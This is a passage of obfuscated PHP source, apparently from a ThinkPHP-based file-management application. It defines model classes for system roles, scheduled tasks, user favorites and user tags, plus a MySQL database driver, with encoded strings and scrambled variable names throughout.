$†ÃŠœ„[571] ? $†ÃŠœ„[8] : $¯ş°±äæ; $Ğ‘¨Ûä· = array(); foreach ($ºò‡ß   as $îşı¶ÁÄ => $•õ™ºí) { $°Á¸Ó¨å = $this->parentLevelArray($•õ™ºí[$†ÃŠœ„[563]]); array_shift($°Á¸Ó¨å); $øšÁü³ª = $¯ş°±äæ; for ($‡™¬§²´ = 0; $‡™¬§²´ < count($°Á¸Ó¨å); $‡™¬§²´++) { $øšÁü³ª .= $ºò‡ß  [$°Á¸Ó¨å[$‡™¬§²´]][$†ÃŠœ„[32]] . $†ÃŠœ„[8]; } $øšÁü³ª .= $•õ™ºí[$†ÃŠœ„[32]]; if ($•õ™ºí[$†ÃŠœ„[463]]) { $øšÁü³ª .= $†ÃŠœ„[8]; } $­ûİö‚ = array($†ÃŠœ„[473] => str_replace($†ÃŠœ„[571], $†ÃŠœ„[8], str_replace($†ÃŠœ„[571], $†ÃŠœ„[8], str_replace($†ÃŠœ„[571], $†ÃŠœ„[8], $øšÁü³ª))), $†ÃŠœ„[594] => intval($•õ™ºí[$†ÃŠœ„[463]]), $†ÃŠœ„[595] => intval($•õ™ºí[$†ÃŠœ„[78]]), $†ÃŠœ„[87] => intval($•õ™ºí[$†ÃŠœ„[87]]), $†ÃŠœ„[89] => $this->pathInfoFilter($•õ™ºí)); if (!$­ûİö‚[$†ÃŠœ„[463]]) { $­ûİö‚[$†ÃŠœ„[519]] = $•õ™ºí[$†ÃŠœ„[519]]; } $Ğ‘¨Ûä·[] = $­ûİö‚; } $Ğ‘¨Ûä· = array_sort_by($Ğ‘¨Ûä·, $†ÃŠœ„[86]); return $Ğ‘¨Ûä·; } } goto CÛ¸ˆÇÊ«Ÿ; DÅ³‚µµ¼İ: class SystemRoleModel extends ModelBaseLight { public $optionType = "\x53\171\163\x74\x65\155\56\162\x6f\x6c\145\x4c\151\163\x74"; public $field = array("\156\141\155\145", "\x61\x75\164\150", "\x6c\x61\x62\145\154", "\144\x69\163\x70\154\141\171", "\x73\171\x73\x74\145\x6d", "\144\x65\163\x63", "\x69\x67\x6e\x6f\162\145\x45\x78\x74", "\151\147\x6e\157\162\145\106\151\154\x65\x53\151\x7a\x65", "\141\x64\155\151\156\x69\x73\x74\162\x61\x74\157\162", "\163\157\162\x74"); public function listData($îßÃšÊ¼ = false, $ÜÌµÇ˜ç = "\x73\x6f\x72\164", $¤“ã›¹û = false) { $ÔÔú›‘£ =& $_SERVER[ú‡®¯¨±]; $×ÛÄş«û = parent::listData($îßÃšÊ¼, $ÜÌµÇ˜ç, $¤“ã›¹û); if (!$îßÃšÊ¼) { foreach ($×ÛÄş«û as $â½øçØ‡ => $Ùçå¶³) { if ($Ùçå¶³[$ÔÔú›‘£[2110]] == 1) { $×ÛÄş«û[$â½øçØ‡][$ÔÔú›‘£[504]] = LNG($ÔÔú›‘£[2349]); } } } return $×ÛÄş«û; } public function update($€ªÃÃ‘­, $Şœ¤ªæº) { $ÜŸªšƒ„ =& $_SERVER[ú‡®¯¨±]; $ÅÅ·¨Ï = parent::listData($€ªÃÃ‘­); $áÏ¾ı·Õ = $this->findByName($Şœ¤ªæº[$ÜŸªšƒ„[32]]); if (!$ÅÅ·¨Ï || $áÏ¾ı·Õ && $áÏ¾ı·Õ[$ÜŸªšƒ„[453]] != $ÅÅ·¨Ï[$ÜŸªšƒ„[453]]) { return !1; } if ($áÏ¾ı·Õ[$ÜŸªšƒ„[2110]] == 1) { $Şœ¤ªæº = array($ÜŸªšƒ„[32] => $Şœ¤ªæº[$ÜŸªšƒ„[32]], $ÜŸªšƒ„[1929] => $Şœ¤ªæº[$ÜŸªšƒ„[1929]]); } $this->filterAuth($Şœ¤ªæº[$ÜŸªšƒ„[465]]); return parent::update($€ªÃÃ‘­, $Şœ¤ªæº); } public function remove($³©ñ†šœ) { $êÁ†òİ… = parent::listData($³©ñ†šœ); if (!$êÁ†òİ… || $êÁ†òİ…[$_SERVER[ú‡®¯¨±][181]]) { return !1; } return parent::remove($³©ñ†šœ); } public function add($İé’´¦³) { $ïÈÒóÛ =& $_SERVER[ú‡®¯¨±]; $õÃ­ˆ«û = $İé’´¦³[$ïÈÒóÛ[32]]; if ($this->findByName($õÃ­ˆ«û)) { return !1; } $üÄüĞÉ¢ = array($ïÈÒóÛ[472] => $õÃ­ˆ«û, $ïÈÒóÛ[1912] => $ïÈÒóÛ[12], $ïÈÒóÛ[1908] => $ïÈÒóÛ[1916], $ïÈÒóÛ[2350] => 1, $ïÈÒóÛ[1911] => 0, $ïÈÒóÛ[2351] => 0, $ïÈÒóÛ[1910] => $this->getSort()); $İé’´¦³ = array_merge($üÄüĞÉ¢, $İé’´¦³); $this->filterAuth($İé’´¦³[$ïÈÒóÛ[465]]); return parent::insert($İé’´¦³); } private function getSort() { $àÍ­İĞ™ =& $_SERVER[ú‡®¯¨±]; $ê”´´ŒÕ = parent::listData(); $Æ·Ÿ©ò = array_to_keyvalue($ê”´´ŒÕ, $àÍ­İĞ™[12], $àÍ­İĞ™[1930]); return empty($Æ·Ÿ©ò) ? 0 : max($Æ·Ÿ©ò) + 1; } private function filterAuth(&$ªÑ¯Óø…) { $™Ò¶„™ö =& $_SERVER[ú‡®¯¨±]; $„ˆï†¥ã = array(); $¸Ñâ‘–è = array_filter(explode($™Ò¶„™ö[50], $ªÑ¯Óø…)); foreach ($¸Ñâ‘–è as $ªÑ¯Óø…) { $Åøæ¼½İ = explode($™Ò¶„™ö[10], $ªÑ¯Óø…); if ($Åøæ¼½İ[0] == $™Ò¶„™ö[2352] && $Åøæ¼½İ[1] != $™Ò¶„™ö[1246]) { $¥ç¶®™‹ = $Åøæ¼½İ[0] . $™Ò¶„™ö[10] . $Åøæ¼½İ[1] . $™Ò¶„™ö[2353]; if (!in_array($¥ç¶®™‹, $¸Ñâ‘–è)) { $„ˆï†¥ã[] = $¥ç¶®™‹; } } $„ˆï†¥ã[] = $ªÑ¯Óø…; } $ªÑ¯Óø… = implode($™Ò¶„™ö[50], $„ˆï†¥ã); } public function findRoleDefault() { $ÁĞĞ˜ı÷ =& $_SERVER[ú‡®¯¨±]; $ÁÁ¨×‰ = parent::listData(); $Í±§ÇÇ = !1; foreach ($ÁÁ¨×‰ as $Èµ£•é‹) { if (!$Èµ£•é‹ || $Èµ£•é‹[$ÁĞĞ˜ı÷[1928]] == $ÁĞĞ˜ı÷[224] || $Èµ£•é‹[$ÁĞĞ˜ı÷[2110]] == 1) { continue; } if (strstr($Èµ£•é‹[$ÁĞĞ˜ı÷[465]], $ÁĞĞ˜ı÷[2354])) { continue; } if (!strstr($Èµ£•é‹[$ÁĞĞ˜ı÷[465]], $ÁĞĞ˜ı÷[2355])) { continue; } if (!$Í±§ÇÇ) { $Í±§ÇÇ = $Èµ£•é‹; continue; } $Ù˜Ü‰ = explode($ÁĞĞ˜ı÷[50], $Í±§ÇÇ[$ÁĞĞ˜ı÷[465]]); $íõ§ˆÔ = explode($ÁĞĞ˜ı÷[50], $Èµ£•é‹[$ÁĞĞ˜ı÷[465]]); if (count($Ù˜Ü‰) > count($íõ§ˆÔ)) { $Í±§ÇÇ = $Èµ£•é‹; } } return $Í±§ÇÇ ? $Í±§ÇÇ[$ÁĞĞ˜ı÷[453]] : $ÁĞĞ˜ı÷[12]; } public function sort($ÂîíªñÚ, $‡À­ÎËÌ) { return parent::update($ÂîíªñÚ, $‡À­ÎËÌ); } } class SystemTaskModel extends ModelBaseLight { public $optionType = "\123\x79\x73\164\145\155\x2e\x74\x61\163\x6b\x4c\x69\163\164"; public $field = array("\156\141\155\x65", "\x74\171\x70\145", "\145\166\145\x6e\164", "\164\x69\155\x65", "\144\x65\163\x63", "\163\x79\x73\164\145\155", "\145\156\x61\x62\154\145", "\154\x61\x73\164\122\165\x6e", "\163\x6f\x72\x74"); public function listData($íØ—‡ğ’ = false, $ÕÄ–‹‚Â = "\163\157\x72\164", $¾’ÊÔº = false) { return parent::listData($íØ—‡ğ’, $ÕÄ–‹‚Â, $¾’ÊÔº); } public function add($µ½‰½•Š) { $¸š¸®²‰ =& $_SERVER[ú‡®¯¨±]; $‚„ø¾«­ = $this->findByName($µ½‰½•Š[$¸š¸®²‰[32]]); if ($‚„ø¾«­) { return !1; } $µ½‰½•Š[$¸š¸®²‰[1659]] = 0; $µ½‰½•Š[$¸š¸®²‰[1930]] = $this->getSort(); return parent::insert($µ½‰½•Š); } private function getSort() { $íß‰£”¾ =& $_SERVER[ú‡®¯¨±]; $íò„ñ†ƒ = parent::listData(); $á…¦ééé = array_to_keyvalue($íò„ñ†ƒ, $íß‰£”¾[12], $íß‰£”¾[1930]); return empty($á…¦ééé) ? 0 : max($á…¦ééé) + 1; } public function update($äÌ‚·²£, $Ú–ˆÏÃ–) { $¤¸ğÚî¯ =& $_SERVER[ú‡®¯¨±]; $ÈÚé³Ó  = $this->listData($äÌ‚·²£); $×Ôò·±Ú = $this->findByName($Ú–ˆÏÃ–[$¤¸ğÚî¯[32]]); if (!$ÈÚé³Ó  || $×Ôò·±Ú && $×Ôò·±Ú[$¤¸ğÚî¯[453]] != $ÈÚé³Ó [$¤¸ğÚî¯[453]]) { return !1; } return parent::update($äÌ‚·²£, $Ú–ˆÏÃ–); } public function remove($ŠŞÏ¼¯©, $¬ˆ°®€ë = false) { $‰³í÷å =& $_SERVER[ú‡®¯¨±]; $ÖøÙÃ› = $this->listData($ŠŞÏ¼¯©); if (!$ÖøÙÃ›) { return; } if (!$¬ˆ°®€ë && $ÖøÙÃ›[$‰³í÷å[181]] == $‰³í÷å[90]) { return !1; } return parent::remove($ŠŞÏ¼¯©); } public function enable($‚Ï£é®, $›¤õ–ŠÃ) { return $this->update($‚Ï£é®, array($_SERVER[ú‡®¯¨±][2344] => $›¤õ–ŠÃ)); } public function run($ß¶Í¹”Ç) { return $this->update($ß¶Í¹”Ç, array($_SERVER[ú‡®¯¨±][2356] => time())); } } class UserFavModel extends ModelBase { protected $tableName = "\165\163\x65\162\x5f\x66\x61\x76"; protected function cacheFunctionAlias($¼‰¹Òˆš) { $™¡Âç£Î =& $_SERVER[ú‡®¯¨±]; return array($™¡Âç£Î[2017] => array(USER_ID, $™¡Âç£Î[2357])); } protected function listData() { $ƒ’™ÄÌ =& $_SERVER[ú‡®¯¨±]; $ÇÈûÓªú = array($ƒ’™ÄÌ[1699] => USER_ID, $ƒ’™ÄÌ[536] => 0); $çàˆÎü« = $ƒ’™ÄÌ[2358]; $ƒ§õº¢ = $this->field($çàˆÎü«)->where($ÇÈûÓªú)->order($ƒ’™ÄÌ[2359])->select(); return $ƒ§õº¢ ? $ƒ§õº¢ : array(); } protected function resetCache() { } protected function listView() { $—ˆˆÏŠ— =& $_SERVER[ú‡®¯¨±]; $·€¶åÄ† = $this->listData(); $ù‡êœ°Ş = array_filter_by_field($·€¶åÄ†, $—ˆˆÏŠ—[33], $—ˆˆÏŠ—[468]); $¶Åï”Ã¹ = array_to_keyvalue($ù‡êœ°Ş, $—ˆˆÏŠ—[12], $—ˆˆÏŠ—[86]); if (!$¶Åï”Ã¹) { return $·€¶åÄ†; } $ƒªğí—ğ = 2000; $ğğ«È­² = array($—ˆˆÏŠ—[469] => array($—ˆˆÏŠ—[470], $¶Åï”Ã¹)); $õÑøçÑ» = Model($—ˆˆÏŠ—[880])->listSource($ğğ«È­², $ƒªğí—ğ); $õÑøçÑ» = array_merge($õÑøçÑ»[$—ˆˆÏŠ—[85]], $õÑøçÑ»[$—ˆˆÏŠ—[84]]); $õÑøçÑ» = array_to_keyvalue($õÑøçÑ», $—ˆˆÏŠ—[183]); foreach ($·€¶åÄ† as $‰Âª›¥ë => $Î¨ùÚó§) { $èĞºàæ‚ = $õÑøçÑ»[$Î¨ùÚó§[$—ˆˆÏŠ—[86]]]; $èĞºàæ‚ = $èĞºàæ‚ ? $èĞºàæ‚ : array(); $·€¶åÄ†[$‰Âª›¥ë] = array_merge($èĞºàæ‚, $Î¨ùÚó§); } return $·€¶åÄ†; } protected function addFav($¢íõˆâ, $şÆ‹ºØ¦ = '', $û¯Ãş×¾ = "\x73\157\x75\x72\x63\x65") { $ş½çŒú´ =& $_SERVER[ú‡®¯¨±]; $ê¹Á§ = array($ş½çŒú´[1699] => USER_ID, $ş½çŒú´[536] => 0, $ş½çŒú´[474] => $û¯Ãş×¾, $ş½çŒú´[473] => $¢íõˆâ); if ($this->where($ê¹Á§)->find()) { return !1; } $ê¹Á§ = array($ş½çŒú´[1699] => USER_ID, $ş½çŒú´[536] => 0); $÷›Á£ñ = $this->where($ê¹Á§)->max($ş½çŒú´[1930]); if (!$÷›Á£ñ) { $÷›Á£ñ = 0; } if (!$şÆ‹ºØ¦ && $û¯Ãş×¾ == $ş½çŒú´[468]) { $ÈÁ©ÇúŞ = Model($ş½çŒú´[1389])->where(array($ş½çŒú´[469] => $¢íõˆâ))->find(); if (!$ÈÁ©ÇúŞ) { return !1; } $şÆ‹ºØ¦ = $ÈÁ©ÇúŞ[$ş½çŒú´[32]]; } $şÆ‹ºØ¦ = $this->getAutoName($şÆ‹ºØ¦); $£äÂå’ = array($ş½çŒú´[1699] => USER_ID, $ş½çŒú´[536] => 0, $ş½çŒú´[472] => $şÆ‹ºØ¦, $ş½çŒú´[473] => $¢íõˆâ, $ş½çŒú´[474] => $û¯Ãş×¾, $ş½çŒú´[1910] => $÷›Á£ñ + 1); return $this->add($£äÂå’); } protected function remove($ÊÄüõÈÒ) { $ÏƒªÑË =& $_SERVER[ú‡®¯¨±]; $ù÷Œïº¤ = array($ÏƒªÑË[1699] => USER_ID, $ÏƒªÑË[471] => $ÊÄüõÈÒ); return $this->where($ù÷Œïº¤)->delete(); } protected function removeByName($¸º²¿ëÀ) { $“¨™·Ò =& $_SERVER[ú‡®¯¨±]; $öàöø” = array($“¨™·Ò[1699] => USER_ID, $“¨™·Ò[472] => $¸º²¿ëÀ, $“¨™·Ò[536] => 0); return $this->where($öàöø”)->delete(); } protected function rename($ÂÉß·Š”, $øãı½Ÿù) { $­è»Ó–Ù =& $_SERVER[ú‡®¯¨±]; if ($ÂÉß·Š” == $øãı½Ÿù) { return !1; } $ôÂà‚Â¾ = $this->getAutoName($øãı½Ÿù); if ($øãı½Ÿù != $ôÂà‚Â¾) { return !1; } $¾…–ß…â = array($­è»Ó–Ù[1699] => USER_ID, $­è»Ó–Ù[536] => 0, $­è»Ó–Ù[32] => $ÂÉß·Š”); return $this->where($¾…–ß…â)->save(array($­è»Ó–Ù[32] => $øãı½Ÿù)); } protected function resetSort($¦Ù‹£«) { $—ø¥Ë™¿ =& $_SERVER[ú‡®¯¨±]; $¦Ù‹£« = is_array($¦Ù‹£«) ? $¦Ù‹£« : array(); $îÄéÀÑÉ = array($—ø¥Ë™¿[1699] => USER_ID); for ($ş†ˆ˜…ã = 0; $ş†ˆ˜…ã < count($¦Ù‹£«); $ş†ˆ˜…ã++) { $îÄéÀÑÉ[$—ø¥Ë™¿[471]] = $¦Ù‹£«[$ş†ˆ˜…ã]; $this->where($îÄéÀÑÉ)->save(array($—ø¥Ë™¿[1910] => $ş†ˆ˜…ã + 1)); } return !0; } protected function moveTop($ÒáŠÃì) { $²‚»ƒ«“ =& $_SERVER[ú‡®¯¨±]; $·‘èĞİ¼ = array($²‚»ƒ«“[1699] => USER_ID, $²‚»ƒ«“[536] => 0); $Š²£Ç­Ö = $this->where($·‘èĞİ¼)->where(array($²‚»ƒ«“[32] => $ÒáŠÃì))->find(); if (!$Š²£Ç­Ö) { return; } $’‘¹Â³Æ = $this->field($²‚»ƒ«“[453])->where($·‘èĞİ¼)->order($²‚»ƒ«“[2359])->select(); $’‘¹Â³Æ = array_to_keyvalue($’‘¹Â³Æ, $²‚»ƒ«“[12], $²‚»ƒ«“[453]); $ˆÃš‹ƒ = $’‘¹Â³Æ; $’‘¹Â³Æ = array_remove_value($’‘¹Â³Æ, $Š²£Ç­Ö[$²‚»ƒ«“[453]]); array_unshift($’‘¹Â³Æ, $Š²£Ç­Ö[$²‚»ƒ«“[453]]); return $this->resetSort($’‘¹Â³Æ); } protected function moveBottom($„êĞŸ›ö) { $ñ÷Ÿ°Ï¹ =& $_SERVER[ú‡®¯¨±]; $æ‹à›® = array($ñ÷Ÿ°Ï¹[1699] => USER_ID, $ñ÷Ÿ°Ï¹[536] => 0); $·Ì÷¯Á = $this->where($æ‹à›®)->max($ñ÷Ÿ°Ï¹[1930]); $İ³Ûäë« = array($ñ÷Ÿ°Ï¹[1930] => $·Ì÷¯Á + 1); return $this->where($æ‹à›®)->where(array($ñ÷Ÿ°Ï¹[32] => $„êĞŸ›ö))->save($İ³Ûäë«); } private function getAutoName($£‚ÑŞ‹¯) { $ÕÂÕİ›Û =& $_SERVER[ú‡®¯¨±]; $©ÕØ î = array($ÕÂÕİ›Û[1699] => USER_ID, $ÕÂÕİ›Û[536] => 0); $ÜµšÇæ‘ = $this->field($ÕÂÕİ›Û[32])->where($©ÕØ î)->select(); $ÜµšÇæ‘ = array_to_keyvalue($ÜµšÇæ‘, $ÕÂÕİ›Û[12], $ÕÂÕİ›Û[32]); if (!$ÜµšÇæ‘ || !in_array($£‚ÑŞ‹¯, $ÜµšÇæ‘)) { return $£‚ÑŞ‹¯; } for ($ûÛ¦¨Ô³ = 0; $ûÛ¦¨Ô³ < count($ÜµšÇæ‘); $ûÛ¦¨Ô³++) { if (!in_array($£‚ÑŞ‹¯ . "\x28{$ûÛ¦¨Ô³}\x29", $ÜµšÇæ‘)) { return $£‚ÑŞ‹¯ . "\x28{$ûÛ¦¨Ô³}\x29"; } } return $£‚ÑŞ‹¯ . "\50{$ûÛ¦¨Ô³}\51"; } } goto a«ÈÀÔîîº; dµãæ£¡®: class UserTagModel extends ModelBaseLight { public $optionType = "\125\163\x65\162\x2e\x74\x61\147\114\x69\163\164"; public $modelType = "\125\163\x65\x72\x4f\x70\x74\x69\157\156"; public $field = array("\156\141\155\x65", "\163\x74\x79\x6c\x65", "\163\157\x72\x74"); public function listData($óİ±•Õ = false, $Ö°â«Ä” = "\x73\157\162\164", $Úˆ„Û³ñ = false) { return parent::listData($óİ±•Õ, $Ö°â«Ä”, $Úˆ„Û³ñ); } public function remove($ ï»­†) { return parent::remove($ ï»­†); } public function add($¨¢Ü³†‹, $ ğ˜æ›› = "\154\141\x62\145\x6c\x2d\x67\162\x65\x79\55\156\x6f\x72\155\x61\x6c") { $ñ£Óş§á =& $_SERVER[ú‡®¯¨±]; if ($this->findByName($¨¢Ü³†‹)) { return !1; } $ÍÙÓóª = array($ñ£Óş§á[472] => $¨¢Ü³†‹, $ñ£Óş§á[537] => $ ğ˜æ››, $ñ£Óş§á[1910] => $this->getSort($ñ£Óş§á[313]) + 1); return parent::insert($ÍÙÓóª); } public function update($³ã×Ôí±, $²¦½µ€½) { $šŒÒ§Ÿ =& $_SERVER[ú‡®¯¨±]; $Ó¸ÂÏâ = $this->listData($³ã×Ôí±); $ÒÖé¬Ä = $this->findByName($²¦½µ€½[$šŒÒ§Ÿ[32]]); if (!$Ó¸ÂÏâ || $ÒÖé¬Ä && $ÒÖé¬Ä[$šŒÒ§Ÿ[453]] != $Ó¸ÂÏâ[$šŒÒ§Ÿ[453]]) { return !1; } return parent::update($³ã×Ôí±, $²¦½µ€½); } public function moveTop($ç”ÂŒÎ) { $ÃâõÅ‡ =& $_SERVER[ú‡®¯¨±]; $û¬¾Ùé˜ = parent::listData(); $Ç ìí…­ = $this->getSort($ÃâõÅ‡[312]); foreach ($û¬¾Ùé˜ as &$³Ï·õŸ) { if ($³Ï·õŸ[$ÃâõÅ‡[453]] == $ç”ÂŒÎ) { $³Ï·õŸ[$ÃâõÅ‡[1930]] = $Ç ìí…­; continue; } $³Ï·õŸ[$ÃâõÅ‡[1930]] += 1; } unset($³Ï·õŸ); return parent::resetData($û¬¾Ùé˜); } public function moveBottom($ûïÕˆ¸) { $Şˆçˆî“ =& $_SERVER[ú‡®¯¨±]; $œÚĞœı = $this->getSort($Şˆçˆî“[313]) + 1; return parent::update($ûïÕˆ¸, array($Şˆçˆî“[1930] => $œÚĞœı)); } public function resetSort($ıÃ‡ÖÃ§) { $·Õ­Í…° =& $_SERVER[ú‡®¯¨±]; $‡’¯›ü¢ = array(); $ıÃ‡ÖÃ§ = is_array($ıÃ‡ÖÃ§) ? $ıÃ‡ÖÃ§ : array(); for ($·ˆ›ŠŠï = 0; $·ˆ›ŠŠï < count($ıÃ‡ÖÃ§); $·ˆ›ŠŠï++) { $‡’¯›ü¢[$ıÃ‡ÖÃ§[$·ˆ›ŠŠï] . $·Õ­Í…°[12]] = $·ˆ›ŠŠï + 1; } $ê“¦£ë´ = parent::listData(); foreach ($ê“¦£ë´ as &$•÷×²û˜) { $©§Ä¼›£ = $‡’¯›ü¢[$•÷×²û˜[$·Õ­Í…°[453]]]; $•÷×²û˜[$·Õ­Í…°[1930]] = $©§Ä¼›£ ? $©§Ä¼›£ : $•÷×²û˜[$·Õ­Í…°[1930]]; } unset($•÷×²û˜); return parent::resetData($ê“¦£ë´); } private function getSort($é£ç·…) { $½•î¦û­ =& $_SERVER[ú‡®¯¨±]; $ÅÀºçêÅ = parent::listData(); $Î¡ØäÆ = array_to_keyvalue($ÅÀºçêÅ, $½•î¦û­[12], $½•î¦û­[1930]); if (!$Î¡ØäÆ) { $Î¡ØäÆ = array(0); } $³¡×¸®Œ = $é£ç·… == $½•î¦û­[313] ? max($Î¡ØäÆ) : min($Î¡ØäÆ); return intval($³¡×¸®Œ); } } goto cÅ™‹ÓƒÖ¥; F¨„¹˜ —Œ: class DbMysql extends Db { public function __construct($„ÍûÌãÂ = '') { $¦Ç”àÎê =& $_SERVER[ú‡®¯¨±]; if (!extension_loaded($¦Ç”àÎê[859])) { think_exception(think_lang($¦Ç”àÎê[14]) . $¦Ç”àÎê[941]); } if (!empty($„ÍûÌãÂ)) { $this->config = $„ÍûÌãÂ; if (empty($this->config[$¦Ç”àÎê[17]])) { $this->config[$¦Ç”àÎê[17]] = $¦Ç”àÎê[12]; } } } public function connect($ãƒ¸Úı³ = '', $ñàÅşòµ = 0, $°¦¢êîœ = false) { $òå‚úÉœ =& $_SERVER[ú‡®¯¨±]; if (!isset($this->linkID[$ñàÅşòµ])) { if (empty($ãƒ¸Úı³)) { $ãƒ¸Úı³ = $this->config; } $‡¯ÄÉÃÂ = $ãƒ¸Úı³[$òå‚úÉœ[942]] . ($ãƒ¸Úı³[$òå‚úÉœ[943]] ? "\72{$ãƒ¸Úı³[$òå‚úÉœ[943]]}" : $òå‚úÉœ[12]); $±ŠºØà³ = !empty($ãƒ¸Úı³[$òå‚úÉœ[17]][$òå‚úÉœ[18]]) ? $ãƒ¸Úı³[$òå‚úÉœ[17]][$òå‚úÉœ[18]] : $this->pconnect; if ($±ŠºØà³) { $this->linkID[$ñàÅşòµ] = mysql_pconnect($‡¯ÄÉÃÂ, $ãƒ¸Úı³[$òå‚úÉœ[944]], $ãƒ¸Úı³[$òå‚úÉœ[945]], 131072); } else { $this->linkID[$ñàÅşòµ] = mysql_connect($‡¯ÄÉÃÂ, $ãƒ¸Úı³[$òå‚úÉœ[944]], $ãƒ¸Úı³[$òå‚úÉœ[945]], !0, 131072); } if (!$this->linkID[$ñàÅşòµ] || !empty($ãƒ¸Úı³[$òå‚úÉœ[21]]) && !mysql_select_db($ãƒ¸Úı³[$òå‚úÉœ[21]], $this->linkID[$ñàÅşòµ])) { think_exception(mysql_error()); } $‚«®íÈ… = mysql_get_server_info($this->linkID[$ñàÅşòµ]); mysql_query($òå‚úÉœ[946] . think_config($òå‚úÉœ[947]) . $òå‚úÉœ[58], $this->linkID[$ñàÅşòµ]); if ($‚«®íÈ… > $òå‚úÉœ[948]) { mysql_query($òå‚úÉœ[949], $this->linkID[$ñàÅşòµ]); } $this->connected = !0; if (1 != think_config($òå‚úÉœ[22])) { unset($this->config); } } return $this->linkID[$ñàÅşòµ]; } public function free() { mysql_free_result($this->queryID); $this->queryID = null; } public function query($¾“Ñ¦ÒÁ) { $õ°µ¥ê© =& $_SERVER[ú‡®¯¨±]; if (0 === stripos($¾“Ñ¦ÒÁ, $õ°µ¥ê©[319])) { $this->close(); $this->connected = !1; } $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $¾“Ñ¦ÒÁ; if ($this->queryID) { $this->free(); } think_action_status($õ°µ¥ê©[23], 1); think_status($õ°µ¥ê©[24]); $this->queryID = mysql_query($¾“Ñ¦ÒÁ, $this->_linkID); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = mysql_num_rows($this->queryID); return $this->getAll(); } } public function execute($•Àò¨) { $•è“âÕ =& $_SERVER[ú‡®¯¨±]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $•Àò¨; if ($this->queryID) { $this->free(); } think_action_status($•è“âÕ[25], 1); think_status($•è“âÕ[24]); $¥à‡«„² = mysql_query($•Àò¨, $this->_linkID); $this->debug(); if (!1 === $¥à‡«„²) { $this->error(); return !1; } else { $this->numRows = mysql_affected_rows($this->_linkID); $this->lastInsID = mysql_insert_id($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { mysql_query($_SERVER[ú‡®¯¨±][950], $this->_linkID); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $Âãú±Óè = mysql_query($_SERVER[ú‡®¯¨±][951], $this->_linkID); $this->transTimes = 0; if (!$Âãú±Óè) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $ ıÅô«ß = mysql_query($_SERVER[ú‡®¯¨±][952], $this->_linkID); $this->transTimes = 0; if (!$ ıÅô«ß) { $this->error(); return !1; } } return !0; } private function getAll() { $™ÑÀ»–¡ = array(); if ($this->numRows > 0) { while ($Œ¤ïúæõ = mysql_fetch_assoc($this->queryID)) { $™ÑÀ»–¡[] = $Œ¤ïúæõ; } mysql_data_seek($this->queryID, 0); } return $™ÑÀ»–¡; } public function getFields($²Ø¡–¨) { $¹èÑ¨Ô½ =& $_SERVER[ú‡®¯¨±]; $Êâ¥¬ = $this->query($¹èÑ¨Ô½[953] . $this->parseKey($²Ø¡–¨)); $ÈÒ»×—ü = array(); if ($Êâ¥¬) { foreach ($Êâ¥¬ as $Â˜ó•²ş => $èÉÒöÆ¿) { $ÈÒ»×—ü[$èÉÒöÆ¿[$¹èÑ¨Ô½[31]]] = array($¹èÑ¨Ô½[32] => $èÉÒöÆ¿[$¹èÑ¨Ô½[31]], $¹èÑ¨Ô½[33] => $èÉÒöÆ¿[$¹èÑ¨Ô½[34]], $¹èÑ¨Ô½[35] => (bool) (strtoupper($èÉÒöÆ¿[$¹èÑ¨Ô½[36]]) === $¹èÑ¨Ô½[954]), $¹èÑ¨Ô½[37] => $èÉÒöÆ¿[$¹èÑ¨Ô½[38]], $¹èÑ¨Ô½[39] => strtolower($èÉÒöÆ¿[$¹èÑ¨Ô½[40]]) == $¹èÑ¨Ô½[41], $¹èÑ¨Ô½[42] => strtolower($èÉÒöÆ¿[$¹èÑ¨Ô½[43]]) == $¹èÑ¨Ô½[44]); } } return $ÈÒ»×—ü; } public function getTables($×âİõË = '') { $Œ«ö€âü =& $_SERVER[ú‡®¯¨±]; if (!empty($×âİõË)) { $æ«Ñ‰È¶ = $Œ«ö€âü[955] . $×âİõË . $Œ«ö€âü[956]; } else { $æ«Ñ‰È¶ = $Œ«ö€âü[957]; } $Æª¼ãòÌ = $this->query($æ«Ñ‰È¶); $ù¤¸§× = array(); foreach ($Æª¼ãòÌ as $ÄÓ‚Ë½ş => $ˆ˜÷òëĞ) { $ù¤¸§×[$ÄÓ‚Ë½ş] = current($ˆ˜÷òëĞ); } return $ù¤¸§×; } public function replace($¶¼Ã¢ò¿, $‚äÛÌ“ = array()) { $–Ã‚í‡º =& $_SERVER[ú‡®¯¨±]; foreach ($¶¼Ã¢ò¿ as $ËÔ³Ìä° => $ìÚİ–Øİ) { $Š†¡Êƒ = $this->parseValue($ìÚİ–Øİ); if (is_scalar($Š†¡Êƒ)) { $Û®ÒÁÛ[] = $Š†¡Êƒ; $ã»ÇÁ™à[] = $this->parseKey($ËÔ³Ìä°); } } $•½€×î¹ = $–Ã‚í‡º[958] . $this->parseTable($‚äÛÌ“[$–Ã‚í‡º[334]]) . $–Ã‚í‡º[959] . implode($–Ã‚í‡º[50], $ã»ÇÁ™à) . $–Ã‚í‡º[960] . implode($–Ã‚í‡º[50], $Û®ÒÁÛ) . $–Ã‚í‡º[961]; return $this->execute($•½€×î¹); } public function insertAll($ÂªåÒŸ, $ı¿³‡— = array(), $÷è•²¾õ = false) { $•óöàæ =& $_SERVER[ú‡®¯¨±]; if (!is_array($ÂªåÒŸ[0])) { return !1; } $ÂÃ¿É¼¿ = array_keys($ÂªåÒŸ[0]); $ŞĞÊßŠ¾ = array(); foreach ($ÂªåÒŸ as $¢ÜôÏşí) { $×ÔÇà· = array(); foreach ($¢ÜôÏşí as $—ÀÂğäà => $ÃŞÓØ¿) { $ÃŞÓØ¿ = $this->parseValue($ÃŞÓØ¿); if (is_scalar($ÃŞÓØ¿)) { $×ÔÇà·[] = $ÃŞÓØ¿; } } $ŞĞÊßŠ¾[] = $•óöàæ[315] . implode($•óöàæ[50], $×ÔÇà·) . $•óöàæ[961]; } array_walk($ÂÃ¿É¼¿, array($this, $•óöàæ[962])); $òšæ¯Ë = ($÷è•²¾õ ? $•óöàæ[963] : $•óöàæ[964]) . $•óöàæ[965] . $this->parseTable($ı¿³‡—[$•óöàæ[334]]) . $•óöàæ[959] . implode($•óöàæ[50], $ÂÃ¿É¼¿) . $•óöàæ[966] . implode($•óöàæ[50], $ŞĞÊßŠ¾); return 